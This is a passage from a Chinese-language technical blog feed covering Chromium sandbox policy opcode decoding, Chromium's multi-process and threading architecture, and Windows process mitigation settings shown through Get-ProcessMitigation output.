class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">GetPolicyOpcode</span><span class="params">(<span class="keyword">const</span> PolicyOpcode* opcode, <span class="keyword">bool</span> continuation)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// See |policy_engine_opcodes.cc|.</span></span><br><span class="line">  <span class="keyword">uint32_t</span> args[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">auto</span> options = opcode-&gt;GetOptions(); <span class="comment">//获取Options，如kPolNegateEval</span></span><br><span class="line">  <span class="keyword">auto</span> param = opcode-&gt;GetParameter(); <span class="comment">//返回操作码所关系的函数的参数。 </span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> condition;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (options &amp; kPolNegateEval) <span class="comment">//检测 opcode 是否标志kPolNegateEval</span></span><br><span class="line">    condition += <span class="string">&quot;!(&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (opcode-&gt;GetID()) &#123;</span><br><span class="line">    <span class="keyword">case</span> OP_ALWAYS_FALSE:</span><br><span class="line">      condition += <span class="string">&quot;false&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> OP_ALWAYS_TRUE:</span><br><span class="line">      condition += <span class="string">&quot;true&quot;</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> OP_NUMBER_MATCH:</span><br><span class="line">      opcode-&gt;GetArgument(<span class="number">1</span>, &amp;args[<span class="number">1</span>]); <span class="comment">//返回存储的参数</span></span><br><span class="line">      <span class="keyword">if</span> (args[<span class="number">1</span>] == UINT32_TYPE) &#123; <span class="comment">//UINT32_TYPE:支持的 C++ 类型编码为数字 id</span></span><br><span class="line">        opcode-&gt;GetArgument(<span class="number">0</span>, &amp;args[<span class="number">0</span>]);</span><br><span class="line">        condition += base::StringPrintf(<span class="string">&quot;p[%d] == %x&quot;</span>, param, args[<span class="number">0</span>]);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">void</span>* match_ptr = <span class="literal">nullptr</span>;</span><br><span class="line">        opcode-&gt;GetArgument(<span class="number">0</span>, &amp;match_ptr);</span><br><span class="line">        condition += base::StringPrintf(<span class="string">&quot;p[%d] == %p&quot;</span>, param, match_ptr);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> OP_NUMBER_MATCH_RANGE:</span><br><span class="line">      opcode-&gt;GetArgument(<span class="number">0</span>, &amp;args[<span class="number">0</span>]);</span><br><span class="line">      opcode-&gt;GetArgument(<span class="number">1</span>, &amp;args[<span class="number">1</span>]);</span><br><span class="line">      condition +=</span><br><span class="line">          base::StringPrintf(<span class="string">&quot;%x &lt;= p[%d] &lt;= %x&quot;</span>, args[<span class="number">0</span>], param, args[<span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> OP_NUMBER_AND_MATCH:</span><br><span class="line">      opcode-&gt;GetArgument(<span class="number">0</span>, &amp;args[<span class="number">0</span>]);</span><br><span class="line">      condition += base::StringPrintf(<span class="string">&quot;p[%d] &amp; %x&quot;</span>, param, args[<span class="number">0</span>]);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> OP_WSTRING_MATCH: &#123;</span><br><span class="line">      <span class="keyword">int</span> pos;</span><br><span class="line">      opcode-&gt;GetArgument(<span class="number">1</span>, &amp;args[<span class="number">1</span>]);  <span class="comment">// Length.</span></span><br><span class="line">      opcode-&gt;GetArgument(<span class="number">2</span>, &amp;pos);      <span class="comment">// Position.</span></span><br><span class="line">      opcode-&gt;GetArgument(<span class="number">3</span>, &amp;args[<span class="number">3</span>]);  <span class="comment">// Options.</span></span><br><span class="line">      <span class="comment">// These are not nul-terminated so we have to wrap them here.</span></span><br><span class="line">      <span class="comment">//检索字符串参数的实际地址</span></span><br><span class="line">      <span class="keyword">auto</span> match_string = <span class="built_in">std</span>::<span class="built_in">wstring</span>(opcode-&gt;GetRelativeString(<span class="number">0</span>), <span class="number">0</span>,</span><br><span class="line">                                       <span class="keyword">static_cast</span>&lt;<span class="keyword">size_t</span>&gt;(args[<span class="number">1</span>]));</span><br><span class="line">      condition += GetStringMatchOperation(pos, args[<span class="number">3</span>]);</span><br><span class="line">      <span class="keyword">if</span> (args[<span class="number">3</span>] &amp; CASE_INSENSITIVE)  <span class="comment">// if Options = 1</span></span><br><span class="line">        condition += <span class="string">&quot;_i&quot;</span>;</span><br><span class="line">      condition +=</span><br><span class="line">          base::StringPrintf(<span class="string">&quot;(p[%d], &#x27;%S&#x27;)&quot;</span>, param, match_string.c_str());</span><br><span class="line">    &#125; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> OP_ACTION:</span><br><span class="line">      opcode-&gt;GetArgument(<span class="number">0</span>, &amp;args[<span class="number">0</span>]);</span><br><span class="line">      condition += GetOpcodeAction(<span class="keyword">static_cast</span>&lt;EvalResult&gt;(args[<span class="number">0</span>]));</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      DCHECK(<span class="literal">false</span>) &lt;&lt; <span class="string">&quot;Unknown Opcode&quot;</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;Unknown&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (options &amp; kPolNegateEval)</span><br><span class="line">    condition += <span class="string">&quot;)&quot;</span>;</span><br><span class="line">  <span class="comment">// If there is another rule add a joining token.</span></span><br><span class="line">  <span class="keyword">if</span> (continuation) &#123;</span><br><span class="line">    <span class="keyword">if</span> (options &amp; kPolUseOREval)</span><br><span class="line">      condition += <span class="string">&quot; || &quot;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      condition += <span class="string">&quot; &amp;&amp; &quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> condition;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="GetStringMatchOperation"><a href="#GetStringMatchOperation" class="headerlink" title="GetStringMatchOperation"></a>GetStringMatchOperation</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">GetStringMatchOperation</span><span class="params">(<span class="keyword">int</span> pos, <span class="keyword">uint32_t</span> options)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (pos == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (options &amp; EXACT_LENGTH)</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;exact&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;prefix&quot;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pos &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;scan&quot;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pos == kSeekToEnd) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ends&quot;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    DCHECK(<span class="literal">false</span>) &lt;&lt; <span class="string">&quot;Invalid pos (&quot;</span> &lt;&lt; pos &lt;&lt; <span class="string">&quot;)&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;unknown&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="StringMatchOptions"><a href="#StringMatchOptions" class="headerlink" title="StringMatchOptions"></a>StringMatchOptions</h2><ul><li><strong>CASE_SENSITIVE = 0：</strong>Pay or Not attention to the case as defined by</li><li><strong>CASE_INSENSITIVE = 1：</strong>RtlCompareUnicodeString windows API.</li><li><strong>EXACT_LENGTH = 2：</strong>Don’t do substring match. Do full string match.</li></ul><h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&quot;NtCreateFile&quot;: [</span><br><span class="line">        &quot;!(p[1] &amp; 1) &amp;&amp; !(prefix(p[0], &#39;\\??\\&#39;)) -&gt; askBroker&quot;,</span><br><span class="line">        &quot;!(p[1] &amp; 1) &amp;&amp; scan(p[0], &#39;~&#39;) -&gt; askBroker&quot;,</span><br><span class="line">        &quot;prefix_i(p[0], &#39;\\??\\pipe\\chrome.&#39;) -&gt; askBroker&quot;,</span><br><span class="line">        &quot;prefix_i(p[0], &#39;\\??\\pipe\\LOCAL\\chrome.&#39;) -&gt; askBroker&quot;</span><br><span class="line">      ],</span><br></pre></td></tr></table></figure><p>上述其实描述的是一个 opcode 组内的 opcode 的值是什么。</p><p><code>!(</code>：opcode 的 option 为 <code>kPolNegateEval</code></p><p><code>p[1] &amp; 1</code>:  <code>&amp;</code> 代表opcode 的类型为<code>OP_NUMBER_AND_MATCH</code>，原函数<code>args[1]=1</code></p><p><code>&amp;&amp;</code>：options 不为<code>kPolUseOREval</code></p><p><code>prefix</code>：String Match Options 不为<code>EXACT_LENGTH</code></p><p>…</p><p>总结：这些数据整体上描述了一个 opcode 组的内容，这个 opcode 组构成了该函数的高级缓解策略。</p>]]></content>
      
      
      <categories>
          
          <category> Chromium </category>
          
          <category> policy </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Chromium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chromium 基础架构</title>
      <link href="posts/d4e8f763/"/>
      <url>posts/d4e8f763/</url>
      
        <content type="html"><![CDATA[<h1 id="多进程架构"><a href="#多进程架构" class="headerlink" title="多进程架构"></a>多进程架构</h1><ul><li><p>Chromium 的每个标签页都是一个独立的进程，为了确保安全，Chromium 会限制每个渲染引擎彼此之间的访问权限，以及他们访问系统其他资源的权限。</p></li><li><p>运行 UI 和管理 Tab/Plugin 的主进程称为”浏览器进程” 或 “浏览器（Browser）”，标签页相关的进程被称作”渲染线程”或”渲染器（renderer）”</p></li><li><p>renderer 使用 Blink 开源引擎来实现解析和 HTML 布局</p>  <img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210723133050.png" style="zoom:67%;" /></li></ul><h2 id="Managing-render-processes"><a href="#Managing-render-processes" class="headerlink" title="Managing render processes"></a>Managing render processes</h2><p>每个渲染进程有一个全局的 RenderProcess 对象，该对象管理渲染进程与父浏览器进程之间的通信，并维护全局状态。浏览器为每个渲染进程维护一个对应的RenderViewHost，用来管理浏览器状态，并与渲染器通信。浏览器与渲染器使用<a href="https://ahangchen.gitbooks.io/chromium_doc_zh/content/zh/General_Architecture/Inter-process_Communication.html">Chromium’s IPC system</a>进行通信。</p><h2 id="Managing-views"><a href="#Managing-views" class="headerlink" title="Managing views"></a>Managing views</h2><p>每个渲染进程都有一个或多个 RenderView 对象，由 <code>RenderProcess</code> 管理(它与标签页的内容相关)。相应的<code>RenderProcessHost</code>维护一个与渲染器中每个view相关的<code>RenderViewHost</code>。每个view被赋予一个view ID，以区分同一个渲染器中的不同view。这些 ID 在一个渲染器中是唯一的，但在浏览器中不是唯一的，所以区分一个view需要一个RenderProcessHost和一个view ID。</p><p>浏览器与特定标签页之间的通信是通过RenderViewHost对象来完成的。</p><h2 id="组件与接口"><a href="#组件与接口" class="headerlink" title="组件与接口"></a>组件与接口</h2><p>In the render process:</p><ul><li><em>RenderProcess</em>通过浏览器中和其对应的<em>RenderProcessHost</em>来处理 IPC。每个渲染进程只有一个RenderProcess对象。所有浏览器-渲染器之间都采用这种方式通信。</li><li>RenderView 对象与浏览器进程中相应的 RenderView 和 WebKit 嵌入层通信（通过RenderProcess）。这个对象代表了一个网页在标签页或一个弹出窗口的内容。</li></ul><p>In the browser process:</p><ul><li>Browser 对象代表了顶级浏览器窗口</li><li>RenderProcessHost 对象代表了浏览器端的浏览器与渲染器的IPC连接。在浏览器进程里，每个渲染进程有一个RenderProcessHost对象。</li><li>RenderViewHost 对象封装与远程 RenderView 的通信，RenderWidgetHost 在浏览器中处理输入和 RenderWidget的绘制。</li></ul><h2 id="共享渲染过程"><a href="#共享渲染过程" class="headerlink" title="共享渲染过程"></a>共享渲染过程</h2><p>通常，每个新的 window 或标签页是在一个新进程里打开的。浏览器会生成一个新的进程，然后指导它去创建一个<em>RenderView</em>。但有时候在标签页或窗口之间共享渲染进程是有必要的。</p><p>这些策略在<a href="https://ahangchen.gitbooks.io/chromium_doc_zh/content/zh/General_Architecture/Process_Models.html">Process Models</a>里有阐述。</p><h2 id="检测-Crash-OR-异常渲染"><a href="#检测-Crash-OR-异常渲染" class="headerlink" title="检测 Crash OR 异常渲染"></a>检测 Crash OR 异常渲染</h2><p>每个和浏览器进程通信的 IPC 都会检测进程的句柄，如果句柄是 signaled，则代表渲染进程 Crashed 相应的标签页也会收到 Crash 的信息。这是 Chromium 将显示一个 sad tab 屏幕，通知用户渲染器已崩溃，该页面可以通过按重新加载按钮或启动新的导航来重新加载。</p><h2 id="Sandboxing-the-renderer"><a href="#Sandboxing-the-renderer" class="headerlink" title="Sandboxing the renderer"></a>Sandboxing the renderer</h2><p>renderer的进程被沙箱化，其权限进行了如下的限制：</p><ul><li>渲染器只能通过其父浏览器进程访问网络</li><li>主机操作系统的内置权限限制了它对文件系统的访问</li><li>rederer 进程运行在单独的Windows桌面上，该桌面对用户是不可见的。</li><li>限制对用户的display 和 related对象的访问</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1] <a href="https://www.cntofu.com/book/101/zh/Start_Here_Background_Reading/Multi-process_Architecture.md">https://www.cntofu.com/book/101/zh/Start_Here_Background_Reading/Multi-process_Architecture.md</a></p><p>[2] <a href="https://ahangchen.gitbooks.io/chromium_doc_zh/content/zh/Start_Here_Background_Reading/Multi-process_Architecture.html">https://ahangchen.gitbooks.io/chromium_doc_zh/content/zh/Start_Here_Background_Reading/Multi-process_Architecture.html</a></p><h1 id="如何显示网页"><a href="#如何显示网页" class="headerlink" title="如何显示网页"></a>如何显示网页</h1><h2 id="应用概念层"><a href="#应用概念层" class="headerlink" title="应用概念层"></a>应用概念层</h2><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210723160221.png"></p><p>每个矩形代表一个应用概念层，每层之间互不相通，层与层之间也没有任何依赖关系。</p><ul><li><strong>WebKit：</strong>Safari，Chromium和其他所有基于 WebKit 的浏览器共享的渲染引擎。WebKit Port是WebKit的一个部分，用来集成平台独立的系统服务，比如资源加载与图像。</li><li><strong>Glue:</strong> 将WebKit类型转换为Chromium类型。该层是 WebKit 的嵌入层。</li><li><strong>Renderer / Render host:</strong> Chromium 多进程架构的嵌入层，代理通知，跨进程边界执行命令。</li><li><strong>WebContents：</strong>一个可重用的组件，它是 Content 模块的主类。它易于嵌入，允许多进程将HTML绘制成View。</li><li><strong>Browser:</strong> 浏览器窗口，它包含多个 WebContentses。</li><li><strong>Tab Helpers</strong>: 可以附加到WebContents的各个对象（通过WebContentsUserData Mixin）。浏览器将这些独立对象中的一种绑定到WebContent给它持有（一个用于Favicons，一个用于infobars）</li></ul><h2 id="The-render-process"><a href="#The-render-process" class="headerlink" title="The render process"></a>The render process</h2><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210723170306.png"></p><p>Chromium 的渲染进程通过 glue接口将 WebKit 端口嵌入。它的工作主要是作为渲染器端到浏览器的<a href="https://ahangchen.gitbooks.io/chromium_doc_zh/content/zh//Start_Here_Background_Reading/General_Architecture">IPC</a>通道。</p><p>reder 中最重要的类是<code>RenderView</code>，在 <code>/content/renderer/render_view_impl.cc</code>。这个对象代表一个 web 网页，处理浏览器进程之间的所有导航相关命令，派生于<code>RenderWidget</code>（RenderWidget 提供绘图和输入事件处理）。RenderView 通过全局 RenderProcess 对象与浏览器进程通信。</p><blockquote><p>RenderWidget 和 RenderView 之间的区别：</p><p>RenderWidget 通过 glue 层(WebWidgetDelegate)的抽象接口映射到一个WebCore:：Widget对象。这基本是屏幕上的一个窗口，用于接收输入事件并在其中进行绘制。</p><p>RenderView 继承自 RenderWidget，代表标签页或弹窗的内容。除了绘制与组件输入事件外，它还处理导航指令。只有一种情况下，RenderWidget可以在没有RenderView时存在，就是网页中的下拉选择框（select box）。下拉选择框必须用native window来渲染（因为其没有独立 web 网页）。</p></blockquote><h3 id="Threads-in-the-renderer"><a href="#Threads-in-the-renderer" class="headerlink" title="Threads in the renderer"></a>Threads in the renderer</h3><p>每个渲染器都有两个线程，The render thread is where the main objects such as the RenderView and all WebKit code run。当渲染器线程与浏览器通信时，消息首先被发送到主线程，然后主线程将消息发送到浏览器进程。除了这种方式，同样还允许我们从渲染器同步地向浏览器发送消息，这种情况一般发生在，需要浏览器返回的结果才能继续执行的事件。例如，在 JavaScript 请求获取页面的cookie时，渲染器线程会阻塞，主线程将对接收到的所有消息排队，直到找到正确的响应。在此期间接收到的任何消息，在这之后都会分配到渲染器线程以进行正常处理。</p><h2 id="The-browser-process"><a href="#The-browser-process" class="headerlink" title="The browser process"></a>The browser process</h2><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210725225424.png"></p><h3 id="Low-level-browser-process-objects"><a href="#Low-level-browser-process-objects" class="headerlink" title="Low-level browser process objects"></a>Low-level browser process objects</h3><p>所有 IPC 与渲染进程的通信都通过浏览器的 I/O线程来完成的，此线程还处理所有网络通信，以防止其干扰用户界面。</p><p>当一个 RenderProcessHost 对象在主线程(用户界面运行的地方)完成初始化时，它会创造新的渲染器进程和一个ChannelProxy IPC对象(具有一个命名了的管道通向渲染器)，自动转发所有的消息回给UI线程的RenderProcessHost。该对象运行在浏览器的 I/O 线程上，监听渲染器的命名管道，并自动将所有消息转发回 UI 线程上的RenderProcessHost。ResourceMessageFilter 也将安装在此通道中，它将过滤掉某些可以直接在I/O线程上处理的消息，如网络请求。筛选的过程发生在 <code>ResourceMessageFilter::OnMessageReceived</code>。</p><p>UI线程中的RenderProcessHost负责分发所有view相关消息给合适的 RenderViewHost（它自己处理有限数量的与非View特定的消息）此调度发生在RenderProcessHost:：OnMessageReceived中。</p><h3 id="High-level-browser-process-objects"><a href="#High-level-browser-process-objects" class="headerlink" title="High-level browser process objects"></a>High-level browser process objects</h3><p>View-specific 信息源于RenderViewHost::OnMessageReceived。大多数消息都在这里处理，其余的转发到RenderWidgetHost基类。这两个对象映射到渲染器中的 RenderView 和 RenderWidget，每个平台都有一个View类以集成到native view系统。</p><p>在RenderView / Widget上方是 WebContents 对象，大部分的消息结束于这个对象的函数调用。WebContents代表网页的内容，它是内容模块中的顶级对象，负责在一个矩形的view中展示网页。</p><p>WebContents 对象包含在 TabContentsWrapper 中。在<code>chrome /</code>中，负责一个标签页。 </p><h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p>[1] <a href="https://www.chromium.org/developers/design-documents/displaying-a-web-page-in-chrome">https://www.chromium.org/developers/design-documents/displaying-a-web-page-in-chrome</a></p><h1 id="Threading-and-Tasks-in-Chrome"><a href="#Threading-and-Tasks-in-Chrome" class="headerlink" title="Threading and Tasks in Chrome"></a>Threading and Tasks in Chrome</h1><p>Chrome 是基于多进程架构的，每个进程又是多线程的。多进程架构主要目的是为了让主线程(例如 Browser 进程中的 UI 线程)和 IO 线程（进程中处理 IPC 消息的线程）保持快速响应。Chromium希望尽量保持UI处于响应状态。为此遵循如下设计原则：</p><ul><li>不在UI线程上执行任何阻塞I/O操作，以及其它耗时操作。</li><li>少用锁和线程安全对象</li><li>避免阻塞I/O线程</li><li>线程之间不要互相阻塞</li><li>在数据准备好更新到共享缓冲时才用锁（在准备数据期间不要用锁）</li></ul><h2 id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h2><ul><li><strong>Task</strong>: task 是一个待处理的工作单元，也可以理解为是具有可选关联状态的函数指针。In Chrome this is <code>base::OnceCallback</code> and <code>base::RepeatingCallback</code> created via <code>base::BindOnce</code> and <code>base::BindRepeating</code>, respectively. (<a href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/callback.md">documentation</a>).</li><li><strong>Task queue</strong>: 待处理的任务队列。</li><li><strong>Physical thread</strong>: 操作系统提供的线程 (e.g. pthread on POSIX or CreateThread() on Windows). The Chrome cross-platform abstraction is <code>base::PlatformThread</code>. </li><li><strong><code>base::Thread</code></strong>: A physical thread 永远处理来自专用任务队列的消息，直到 Quit()。</li><li><strong>Thread pool</strong>: 具有共享任务队列的物理线程池. In Chrome, this is <code>base::ThreadPoolInstance</code>. </li><li><strong>Sequence</strong> or <strong>Virtual thread</strong>: chrome 管理的执行线程。与 physical thread 一样，在任何给定时刻只有一个任务可以在给定的 sequence / virtual thread 线程上运行，并且每个任务都可以看到前面任务的副作用。 任务会按顺序执行，但可能会在每个physical thread之间跳转。</li><li><strong>Task runner</strong>: 一个可以发布任务的界面. In Chrome this is <code>base::TaskRunner</code>.</li><li><strong>Sequenced task runner</strong>: 任务运行程序，它保证发布到它的任务将按发布顺序运行。每个这样的任务都能看到它之前的任务的副作用，发布到序列任务运行器的任务通常由单个线程（virtual or physical）处理。 In Chrome this is <code>base::SequencedTaskRunner</code> which is-a <code>base::TaskRunner</code>.</li><li><strong>Single-thread task runner</strong>: 一个有序的任务运行程序，它保证所有任务都由相同的物理(physical)线程处理。 In Chrome this is <code>base::SingleThreadTaskRunner</code> which is-a <code>base::SequencedTaskRunner</code>. </li></ul><h2 id="Threads"><a href="#Threads" class="headerlink" title="Threads"></a>Threads</h2><p>每个 chrome 的进程都包含如下线程：</p><ul><li>主线程<ul><li>in the browser process (BrowserThread::UI): updates the UI</li><li>in renderer processes (Blink main thread): runs most of Blink</li></ul></li><li>IO 线程<ul><li>在所有进程中：所有IPC消息都到达该线程，处理消息的应用程序逻辑可能位于不同的线程中（IO线程可能将消息路由到绑定到不同线程的Mojo接口）</li><li>大多数异步 I/O 都发生在这个线程上 (base::FileDescriptorWatcher).</li><li>浏览器进程下是<code>BrowserThread::IO</code></li></ul></li><li>一些专用线程</li><li>一个通用线程池</li></ul><p>大多数线程都有一个循环，用以从队列中获取任务并运行它们（队列可以在多个线程之间共享）。</p><h2 id="Tasks"><a href="#Tasks" class="headerlink" title="Tasks"></a>Tasks</h2><p>task 是用以异步执行的工作单元，由<code>base::OnceClosure</code>添加到队列。<code>base::OnceClosure</code>存储着函数指针和参数，通过 <code>Run()</code>来调用所存储的函数指针。<code>base::OnceClosure</code>通过<code>base::BindOnce</code></p><p>来声明。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TaskA</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TaskB</span><span class="params">(<span class="keyword">int</span> v)</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> task_a = base::BindOnce(&amp;TaskA);</span><br><span class="line"><span class="keyword">auto</span> task_b = base::BindOnce(&amp;TaskB, <span class="number">42</span>);</span><br></pre></td></tr></table></figure><h3 id="执行方式"><a href="#执行方式" class="headerlink" title="执行方式"></a>执行方式</h3><ul><li>并行(Parallel)：没有任务执行顺序，可能在任何线程上执行所有任务（通过线程池实现）</li><li>顺序执行(Sequenced)：在任何线程上，按照提交顺序一次执行一个任务（通过 <code>SequencedTaskRunner</code> 实现）</li><li>单线程(Single Threaded)：按发送顺序执行的任务，在单个线程上一次执行一个任务 (通过 <code>SingleSuqenceTaskRunner</code> 实现)<ul><li>COM Single Threaded：COM已初始化的单线程的变体。</li></ul></li></ul><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p>[1] <a href="https://chromium.googlesource.com/chromium/src/+/lkgr/docs/threading_and_tasks.md">https://chromium.googlesource.com/chromium/src/+/lkgr/docs/threading_and_tasks.md</a></p>]]></content>
      
      
      <categories>
          
          <category> Chromium </category>
          
          <category> Architecture </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Chromium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows Mitigation</title>
      <link href="posts/ee684c01/"/>
      <url>posts/ee684c01/</url>
      
        <content type="html"><![CDATA[<p>我们可以使用<code>Get-ProcessMitigation</code>来查询某一进程所开启的保护：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\air\Desktop&gt; Get-ProcessMitigation 12092</span><br><span class="line"></span><br><span class="line">ProcessName                      : msedge</span><br><span class="line">Source                           : Running Process</span><br><span class="line">Id                               : 12092</span><br><span class="line"></span><br><span class="line">DEP:</span><br><span class="line">    Enable                             : ON</span><br><span class="line">    EmulateAtlThunks                   : ON</span><br><span class="line"></span><br><span class="line">ASLR:</span><br><span class="line">    BottomUp                           : ON</span><br><span class="line">    ForceRelocateImages                : OFF</span><br><span class="line">    RequireInfo                        : OFF</span><br><span class="line">    HighEntropy                        : ON</span><br><span class="line"></span><br><span class="line">StrictHandle:</span><br><span class="line">    Enable                             : OFF</span><br><span class="line"></span><br><span class="line">System Call:</span><br><span class="line">    DisableWin32kSystemCalls           : ON</span><br><span class="line">    Audit                              : OFF</span><br><span class="line"></span><br><span class="line">ExtensionPoint:</span><br><span class="line">    DisableExtensionPoints             : ON</span><br><span class="line"></span><br><span class="line">DynamicCode:</span><br><span class="line">    BlockDynamicCode                   : OFF</span><br><span class="line">    AllowThreadsToOptOut               : OFF</span><br><span class="line">    Audit                              : OFF</span><br><span class="line"></span><br><span class="line">CFG:</span><br><span class="line">    Enable                             : ON</span><br><span class="line">    SuppressExports                    : 